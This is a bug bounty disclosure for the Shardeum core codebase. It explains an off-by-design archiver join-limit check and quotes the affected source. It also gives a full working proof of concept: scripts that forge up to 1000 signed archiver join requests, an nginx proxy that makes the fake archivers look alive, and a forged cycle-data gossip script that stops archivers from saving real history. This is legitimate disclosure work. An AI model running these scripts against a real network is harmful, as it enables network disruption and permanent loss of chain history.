# 34349 - \[BC - High] Archiver Join Limit Logic Error

Submitted on Aug 9th 2024 at 22:50:30 UTC by @Lastc0de for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34349

Report type: Blockchain/DLT

Report severity: High

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

## Brief/Intro

Archivers can join network without any staking. Network has a max limit for archivers to join, but shardus-core has a bug that allows more than MAX limit archiver to join the network.

This bug can harm network in many ways, for example it disallows any other archiver from joining the network, or when a node wants to join/left the network, it finds a random archiver and requests some data from it, because a malicious actor can join it's archivers more than specified limit, it is possible that every time a node selects a random archiver that archiver is one of these malicious ones. So bad actor can return invalid data and break the network. Another example which i provided a POC for it, can completely disable archivers functionality to save Cycle data, so history of blockchain would be lost forever.

I will explain the problem here and provide a POC after.

## Vulnerability Details

For an archiver to join the network, it should send a http request to a node. Node handles request here:

*shardus-core/src/p2p/Archivers.ts*

```typescript
export function registerRoutes() {
  network.registerExternalPost('joinarchiver', async (req, res) => {
    const err = validateTypes(req, { body: 'o' })
    if (err) {
      warn(`joinarchiver: bad req ${err}`)
      return res.send({ success: false, error: err })
    }

    const joinRequest = req.body
    if (logFlags.p2pNonFatal) info(`Archiver join request received: ${Utils.safeStringify(joinRequest)}`)

    const accepted = await addArchiverJoinRequest(joinRequest)
...
  }
}
```

then `addArchiverJoinRequest` function is called which does some validations and adds join request to a list and propagates it to other nodes

*src/shardus/index.ts*

```typescript
export function addArchiverJoinRequest(joinRequest: P2P.ArchiversTypes.Request, tracker?, gossip = true) {
  // validate input
  let err = validateTypes(joinRequest, { nodeInfo: 'o', requestType: 's', requestTimestamp: 'n', sign: 'o' })
  if (err) {
    warn('addJoinRequest: bad joinRequest ' + err)
    return { success: false, reason: 'bad joinRequest ' + err }
  }
  err = validateTypes(joinRequest.nodeInfo, {
    curvePk: 's',
    ip: 's',
    port: 'n',
    publicKey: 's',
  })
  if (err) {
    warn('addJoinRequest: bad joinRequest.nodeInfo ' + err)
    return { success: false, reason: 'bad joinRequest ' + err }
  }
  if (joinRequest.requestType !== P2P.ArchiversTypes.RequestTypes.JOIN) {
    warn('addJoinRequest: invalid joinRequest.requestType')
    return { success: false, reason: 'invalid joinRequest.requestType' }
  }
  err = validateTypes(joinRequest.sign, { owner: 's', sig: 's' })
  if (err) {
    warn('addJoinRequest: bad joinRequest.sign ' + err)
    return { success: false, reason: 'bad joinRequest.sign ' + err }
  }
  if (!crypto.verify(joinRequest, joinRequest.nodeInfo.publicKey)) {
    warn('addJoinRequest: bad signature')
    return { success: false, reason: 'bad signature ' }
  }
  if (archivers.get(joinRequest.nodeInfo.publicKey)) {
    warn('addJoinRequest: This archiver is already in the active archiver list')
    return { success: false, reason: 'This archiver is already in the active archiver list' }
  }
  const existingJoinRequest = joinRequests.find(
    (j) => j.nodeInfo.publicKey === joinRequest.nodeInfo.publicKey
  )
  if (existingJoinRequest) {
    warn('addJoinRequest: This archiver join request already exists')
    return { success: false, reason: 'This archiver join request already exists' }
  }
  if (Context.config.p2p.forceBogonFilteringOn) {
    if (isBogonIP(joinRequest.nodeInfo.ip)) {
      warn('addJoinRequest: This archiver join request uses a bogon IP')
      return { success: false, reason: 'This archiver join request is a bogon IP' }
    }
  }

  if (archivers.size > 0) {
    // Check the archiver version from dapp
    if (Context.config.p2p.validateArchiverAppData) {
      const validationResponse = validateArchiverAppData(joinRequest)
      if (validationResponse && !validationResponse.success) return validationResponse
    }

    // Check if the archiver request timestamp is within the acceptable timestamp range (after current cycle, before next cycle)
    const requestTimestamp = joinRequest.requestTimestamp
    const cycleDuration = newest.duration
    const cycleStart = newest.start
    const currentCycleStartTime = (cycleStart + cycleDuration) * 1000
    const nextCycleStartTime = (cycleStart + 2 * cycleDuration) * 1000

    if (requestTimestamp < currentCycleStartTime) {
      warn('addJoinRequest: This archiver join request timestamp is earlier than acceptable timestamp range')
      return {
        success: false,
        reason: 'This archiver join request timestamp is earlier than acceptable timestamp range',
      }
    }
    if (requestTimestamp > nextCycleStartTime) {
      warn('addJoinRequest: This archiver join request timestamp exceeds acceptable timestamp range')
      return {
        success: false,
        reason: 'This archiver join request timestamp exceeds acceptable timestamp range',
      }
    }

    // Get the consensus radius of the network
    try {
      const {
        shardGlobals: { consensusRadius },
      } = Context.stateManager.getCurrentCycleShardData()
      if (archivers.size >= consensusRadius * config.p2p.maxArchiversSubscriptionPerNode) {
        warn('addJoinRequest: This archiver cannot join as max archivers limit has been reached')
        return { success: false, reason: 'Max number of archivers limit reached' }
      }
    } catch (e) {
      warn('addJoinRequest: Failed to get consensus radius', e)
      return { success: false, reason: 'This node is not ready to accept this request!' }
    }
  }

  joinRequests.push(joinRequest)
  if (logFlags.console)
    console.log(
      `Join request added in cycle ${CycleCreator.currentCycle}, quarter ${CycleCreator.currentQuarter}`,
      joinRequest
    )
  if (gossip === true) {
    Comms.sendGossip('joinarchiver', joinRequest, tracker, null, NodeList.byIdOrder, true)
  }
  return { success: true }
}
```

we can see `addArchiverJoinRequest` function checks that active archivers count is not greater than maximum allowed value:

```typescript
const {
  shardGlobals: { consensusRadius },
} = Context.stateManager.getCurrentCycleShardData()
if (archivers.size >= consensusRadius * config.p2p.maxArchiversSubscriptionPerNode) {
  warn('addJoinRequest: This archiver cannot join as max archivers limit has been reached')
  return { success: false, reason: 'Max number of archivers limit reached' }
}
```

and the bug is here, because **every accepted join request** would be **appended to active archiver list** (i will show it later) here **you must check that archivers.size + joinRequests.size** not be greater than maximum value.

So our join request is appended to `joinRequests` array. We continue with how shardeum uses this list. In every cycle a node calls `getTxs()` function on every submodule to process those transactions and adds them to block.

*shardus-core/src/p2p/CycleCreator.ts*

```typescript
function collectCycleTxs(): P2P.CycleCreatorTypes.CycleTxs {
  /* prettier-ignore */ if (logFlags.p2pNonFatal) console.log('collectCycleTxs: inside collectCycleTxs')
  // Collect cycle txs from all submodules
  const txs = submodules.map((submodule) => submodule.getTxs())
  return Object.assign({}, ...txs)
}
```

`Archivers.ts` that we saw earlier is a sub module, it returns transactions as below:

*shardus-core/src/p2p/Archivers.ts*

```typescript
export function getTxs(): P2P.ArchiversTypes.Txs {
  // [IMPORTANT] Must return a copy to avoid mutation
  const requestsCopy = deepmerge({}, [...joinRequests, ...leaveRequests])
  if (logFlags.console)
    console.log(`getTxs: Cycle ${CycleCreator.currentCycle}, Quarter: ${CycleCreator.currentQuarter}`, {
      archivers: requestsCopy,
    })

  return {
    archivers: requestsCopy,
  }
}
```

so it returns `joinRequests` and `leaveRequests`. Then `CycleCreator` calls `makeCycleData` to create a block:

*shardus-core/src/p2p/CycleCreator.ts*

```typescript
async function runQ3() {
  currentQuarter = 3
  Self.emitter.emit('cycle_q3_start')
  if (logFlags.p2pNonFatal) info(`C${currentCycle} Q${currentQuarter}`)

  profilerInstance.profileSectionStart('CycleCreator-runQ3')
  // Get txs and create this cycle's record, marker, and cert
  txs = collectCycleTxs()
  ;({ record, marker, cert } = makeCycleData(txs, CycleChain.newest))
}
```

which calls `makeCycleRecord`

*shardus-core/src/p2p/CycleCreator.ts*

```typescript
function makeCycleData(txs: P2P.CycleCreatorTypes.CycleTxs, prevRecord?: P2P.CycleCreatorTypes.CycleRecord) {
  const record = makeCycleRecord(txs, prevRecord)
  const marker = makeCycleMarker(record)
  const cert = makeCycleCert(marker)
  return { record, marker, cert }
}
```

which calls `updateRecord` on submodules

*shardus-core/src/p2p/CycleCreator.ts*

```typescript
function makeCycleRecord(
  cycleTxs: P2P.CycleCreatorTypes.CycleTxs,
  prevRecord?: P2P.CycleCreatorTypes.CycleRecord
): P2P.CycleCreatorTypes.CycleRecord {
  const baseRecord: P2P.CycleCreatorTypes.BaseRecord = {
    networkId: prevRecord ? prevRecord.networkId : randomBytes(32),
    counter: prevRecord ? prevRecord.counter + 1 : 0,
    previous: prevRecord ? makeCycleMarker(prevRecord) : '0'.repeat(64),
    start:
      prevRecord && prevRecord.mode !== 'shutdown'
        ? prevRecord.start + prevRecord.duration
        : utils.getTime('s'),
    duration: prevRecord ? prevRecord.duration : config.p2p.cycleDuration,
    networkConfigHash: makeNetworkConfigHash(),
  }

  currentStart = baseRecord.start

  const cycleRecord = Object.assign(baseRecord, {
    joined: [],
    returned: [],
    lost: [],
    lostSyncing: [],
    refuted: [],
    apoptosized: [],
    nodeListHash: '',
    archiverListHash: '',
    standbyNodeListHash: '',
    random: config.debug.randomCycleData ? Math.floor(Math.random() * 1000) + 1 : 0,
  }) as P2P.CycleCreatorTypes.CycleRecord

  submodules.map((submodule) => submodule.updateRecord(cycleTxs, cycleRecord, prevRecord))
}
```

`updateRecord()` function in `Archivers.ts` is defined as

*shardus-core/src/p2p/Archivers.ts*

```typescript
export function updateRecord(txs: P2P.ArchiversTypes.Txs, record: P2P.CycleCreatorTypes.CycleRecord) {
  // Add joining archivers to the cycle record
  const joinedArchivers = txs.archivers
    .filter((request) => request.requestType === P2P.ArchiversTypes.RequestTypes.JOIN)
    .map((joinRequest) => joinRequest.nodeInfo)

  // Add leaving archivers to the cycle record
  const leavingArchivers = txs.archivers
    .filter((request) => request.requestType === P2P.ArchiversTypes.RequestTypes.LEAVE)
    .map((leaveRequest) => leaveRequest.nodeInfo)

  if (logFlags.console)
    console.log(
      `Archiver before updating record: Cycle ${CycleCreator.currentCycle}, Quarter: ${CycleCreator.currentQuarter}`,
      joinedArchivers,
      leavingArchivers
    )

  record.joinedArchivers = joinedArchivers.sort(
    (a: P2P.ArchiversTypes.JoinedArchiver, b: P2P.ArchiversTypes.JoinedArchiver) =>
      a.publicKey > b.publicKey ? 1 : -1
  )
  record.leavingArchivers = leavingArchivers.sort(
    (a: P2P.ArchiversTypes.JoinedArchiver, b: P2P.ArchiversTypes.JoinedArchiver) =>
      a.publicKey > b.publicKey ? 1 : -1
  )
  if (logFlags.console)
    console.log(
      `Archiver after updating record: Cycle ${CycleCreator.currentCycle}, Quarter: ${CycleCreator.currentQuarter}`,
      record
    )

  // resetLeaveRequests()
}
```

as we can wee, it appends all `joinReqests` to list of active archivers

```typescript
  const joinedArchivers = txs.archivers
    .filter((request) => request.requestType === P2P.ArchiversTypes.RequestTypes.JOIN)
    .map((joinRequest) => joinRequest.nodeInfo)
...
record.joinedArchivers = joinedArchivers.sort(
    (a: P2P.ArchiversTypes.JoinedArchiver, b: P2P.ArchiversTypes.JoinedArchiver) =>
      a.publicKey > b.publicKey ? 1 : -1
  )
```

so this record would be parsed by nodes and archivers in the network, and they would add these new archivers to their active archiver list.

So i will provide a POC to add more archivers than expected, after that i will show one consequence of this bug which is blocking archivers from persisting new blocks

## Impact Details

This bug could affect all validators and archivers, collectors that collect historical data and explorer which displays them..

## References

Add any relevant links to documentation or code

## Proof of Concept

1. clone repositories

```bash
git clone git@github.com:shardeum/shardeum.git
git clone git@github.com:shardeum/archive-server.git
```

2. we want to have a network with at least 17 nodes, because **consensusRadius** is 16 for a small network and we want more nodes than this for next part of POC. Also change `forceBogonFilteringOn: false` in `src/config/index.ts` because we are running all nodes in one machine, or if you can run the blockchain in multiple machines so it is ok to not change any config. So start a network with 18 nodes for example. (one way is to follow README.ms file in shardeum repository and execute `shardus start 18`)
3. After all nodes became *active* run `cd archive-server` to go to this repository, then run `npm install && npm run prepare`
4. create a file and name it `sign.js` and write below code to it

*sign.js*

```javascript
const { signObj, stringify } = require('@shardus/crypto-utils')
const { Utils } = require('@shardus/types')
const { setCryptoHashKey } = require('./build/Crypto')

const cryptoHashKey = '69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc'
setCryptoHashKey(cryptoHashKey)

function initJoinReq(publicKey, secretKey, curvePk, ip, port) {
  const req = {
    nodeInfo: {
      curvePk,
      ip,
      port,
      publicKey,
    },
    appData: { version: '3.4.23' },
    requestType: 'JOIN',
    requestTimestamp: Date.now(),
  }

  return sign(req, publicKey, secretKey)
}

function sign(obj, publicKey, secretKey) {
  const objCopy = Utils.safeJsonParse(stringify(obj))
  signObj(objCopy, secretKey, publicKey)
  return objCopy
}

module.exports = {
  sign,
  initJoinReq,
}
```

5. create a file and name it `utils.js` and write below code to it

*utils.js*

```javascript
const fetch = require('node-fetch')
const { core } = require('./build/Crypto')
const { initJoinReq } = require('./sign')
const { Utils } = require('@shardus/types')

async function requestJoin(nodePort, myArchiverIp, myArchiverPort, keypair) {
  const realCurve = core.convertSkToCurve(keypair.secretKey)
  const curve = realCurve
  const body = initJoinReq(keypair.publicKey, keypair.secretKey, curve, myArchiverIp, myArchiverPort)

  const url = `http://localhost:${nodePort}/joinarchiver`

  const res = await fetch.default(url, {
    method: 'post',
    body: Utils.safeStringify(body),
    headers: { 'Content-Type': 'application/json' },
    timeout: 100 * 1000,
  })

  console.log(`added archiver ${myArchiverPort}: `, await res.json())
}

module.exports = {
  requestJoin,
}
```

6. then create a file and name it `join.js` and copy below code into it. This file sends at most 1000 join request to a node with port `nodePort` which is 9004 (you can change it if your nodes are running in different ports). It also tells the node for each join request, our archiver port is a number between `myArchiverPortStart` to `myArchiverPortEnd`. Archivers with different `publicKey` but same `ip:port` are allowed to join the network. which is a bug too, but that is not case of this report, Anyway, we want our new archivers to have different `ip:port` because later we need it to maliciously disable functionality of archivers.

*join.js*

```javascript
const Crypto = require('./build/Crypto.js')

const count = 1000
const keys = []
for (let i = 0; i < count; i++) {
  const keypair = Crypto.core.generateKeypair()
  keys.push({
    publicKey: keypair.publicKey,
    secretKey: keypair.secretKey,
  })
}
writeFileSync('keys.json', JSON.stringify(keys))

const waitMs = 100
const ip = '127.0.0.1'
var nodePort = 9004
const MaxRequestCount = count
const myArchiverPortStart = 23500
const myArchiverPortEnd = 23509

;(async () => {
  let i = 0
  const myArchiverPortRange = myArchiverPortEnd - myArchiverPortStart + 1

  while (true) {
    if (i >= MaxRequestCount) {
      break
    }

    const myArchiverPort = myArchiverPortStart + (i % myArchiverPortRange)
    await requestJoin(nodePort, ip, myArchiverPort, {
      secretKey: keys[i].secretKey,
      publicKey: keys[i].publicKey,
    })
    console.log(`join request ${i + 1} sent.`)
    // break
    await new Promise((resolve) => setTimeout(resolve, waitMs))
    ++i
  }
})()
```

7. By default configuration, network does not removes an archiver if it is down or not responding. But we assume this functionality is enbaled and we want our new archivers to respond to network requests. One way is to actually run 1000 archiver but it is not required, we can simply fool the network, and proxy every request to a real archiver. for this i used nginx. install nginx on your device (sudo apt install nginx) and append this text to `/etc/nginx/nginx.conf`. It is like a port mapping from our archivers port to real archiver port which is 4000. So every request to our archiver would be answered by archiver at `127.0.0.1:4000`.

```
stream {
  upstream stream_archiver {
    server 127.0.0.1:4000;
  }

  server {
    listen 23500;
proxy_pass stream_archiver;
  }
  server {
    listen 23501;
proxy_pass stream_archiver;
  }
  server {
    listen 23502;
proxy_pass stream_archiver;
  }
  server {
    listen 23503;
proxy_pass stream_archiver;
  }
  server {
    listen 23504;
proxy_pass stream_archiver;
  }
  server {
    listen 23505;
proxy_pass stream_archiver;
  }
  server {
    listen 23506;
proxy_pass stream_archiver;
  }
  server {
    listen 23507;
proxy_pass stream_archiver;
  }
  server {
    listen 23508;
proxy_pass stream_archiver;
  }
  server {
    listen 23509;
proxy_pass stream_archiver;
  }
}
```

8. Now we have our fake archivers. execute `node join.js` to generate some public/private key and send join requests to network. When you see *max limit reached* in console you can press Ctrl+C to terminate remaining requests.
9. now if you open `http://localhost:4000/archivers` in your browser, you can see many archivers are joined as active to the network.

Untill now we showed how archiver join limit validation bug can not prevent archivers from joining the network. Now we are going to use this bug and make all archivers useless.

1. Open `http://localhost:4000/archivers` in your browser, copy two of our fake archiver publicKeys which have different port number, crate a file and name it `gossipdata.js` with following text. Replace `pkList` array items with those two publicKeys. Also open `http://localhost:4000/cycleinfo/1` in your browser and copy first item of `cycleInfo` array, and replace default value of `cycle` object in following file with it.

*gossipdata.js*

```javascript
const fetch = require('node-fetch')
const { readFileSync } = require('fs')
const { sign } = require('./sign')
const { computeCycleMarker } = require('./build/Data/Cycles.js')
const { Utils } = require('@shardus/types')

const pkList = [
  '865b1c5cdc6df064c17fc397827d449bbaec61c926939ede1138604216741bae',
  '865b1c5cdc6df064c17fc397827d449bbaec61c926939ede1138604216741bae',
]

const archiverPort = 4000

async function sendGossipData(keypair) {
  const cycle = {
    activated: [],
    activatedPublicKeys: [],
    active: 18,
    apoptosized: [],
    appRemoved: [],
    archiverListHash: '3008f0303a3a929a3dc628a8548a18d5ec7d3f65938a0f860257cfaa458cf9fe',
    counter: 37,
    desired: 300,
    duration: 30,
    expired: 1,
    finishedSyncing: [],
    joined: [],
    joinedArchivers: [],
    joinedConsensors: [],
    leavingArchivers: [],
    lost: [],
    lostAfterSelection: [],
    lostArchivers: [],
    lostSyncing: [],
    marker: '8e950d2e95e6d27eab46abddf11d937951e9469c4383abe93e86b10e550ccb74',
    maxSyncTime: 1200,
    mode: 'forming',
    networkConfigHash: '59472da61062211d1f86b938c87d644fb65a6c887119b6d0b703f0c162660494',
    networkId: 'e4eef0c6ec068771c37f3e78b13d28c8d1327ffa0c5e431c722c0434f6125add',
    nodeListHash: '683eceb68cdd756c08ea5d0b07a232ecfbf897dc4096b45036822595dd3d551c',
    previous: '8cf398b90fab67190543fd2a9e2ad51f48557e9bcc9a88c926fc157754d6ef3a',
    random: 0,
    refreshedArchivers: [],
    refreshedConsensors: [],
    refuted: [],
    refutedArchivers: [],
    removed: [],
    removedArchivers: [],
    returned: [],
    standby: 0,
    standbyAdd: [],
    standbyNodeListHash: '78c7d4bfca718a92b57a31832c1c8460f43dee960b5f4cf4bbdae3bcce2deb6d',
    standbyRefresh: [],
    standbyRemove: [],
    start: 1723208964,
    startedSyncing: [],
    syncing: 0,
    target: 27,
  }
  cycle.counter = 99999997
  const cycleCopy = { ...cycle }
  delete cycleCopy.marker
  cycle.marker = computeCycleMarker(cycleCopy)

  const data = {
    dataType: 'CYCLE',
    data: [cycle],
  }

  const signedData = sign(data, keypair.publicKey, keypair.secretKey)

  console.log(JSON.stringify(signedData))

  const url = `http://localhost:${archiverPort}/gossip-data`

  const res = await fetch.default(url, {
    method: 'post',
    body: Utils.safeStringify(signedData),
    headers: { 'Content-Type': 'application/json' },
    timeout: 100 * 1000,
  })

  console.log(`gossip data result`, await res.json())
}

;(async () => {
  const keys = JSON.parse(readFileSync('./keys.json', 'utf8'))
  for (let pk of pkList) {
    const keypair = keys.find((k) => k.publicKey == pk)

    await sendGossipData(keypair)
  }
})()
```

this script is sending a fake cycle value to archiver. we used two publicKey to sign it because archiver uses consensusRadius and number of active nodes to calculate how many archivers should sign a cycle data to be persisted. and because it is 16 and we have 18 nodes so we need two archiver to sign it. This script also changes `cycle.counter` to a big number for example 9999999, so from now in each block when nodes send actual cycles which has `counter` less than this value would be discarded.
